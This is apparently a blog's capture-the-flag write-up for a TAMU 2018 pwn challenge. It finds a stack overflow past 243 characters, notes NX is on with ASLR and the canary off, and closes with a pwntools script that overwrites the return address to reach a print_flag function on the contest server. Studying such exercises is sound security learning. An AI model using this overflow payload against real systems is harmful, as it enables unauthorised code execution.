My intuition is suggesting me to mess with the length of the input string.

After some trials, I found that with a string longer than 243 characters, the program halts in [SIGSEGV](https://en.wikipedia.org/wiki/Segmentation_fault).

This time, the buffer is long enough for a shellcraft... if only the NX bit were disabled.

I can't proceed in that direction. Should I use ROP?

Why the hell? There is the `print_flag` function in the binary! As regards ASLR and canary, same as [pwn1]({{site.base_url}}/writeups/TAMU2018/pwn1), they are both disabled.

So, the exploit is:

```
from pwn import *

OFFSET = 243
shell = p32(0x0804854b)
exploit = 'A'*OFFSET + shell
rem = remote('pwn.ctf.tamu.edu', 4322)
rem.sendline(exploit)
rem.interactive()

```


Flag captured :-D
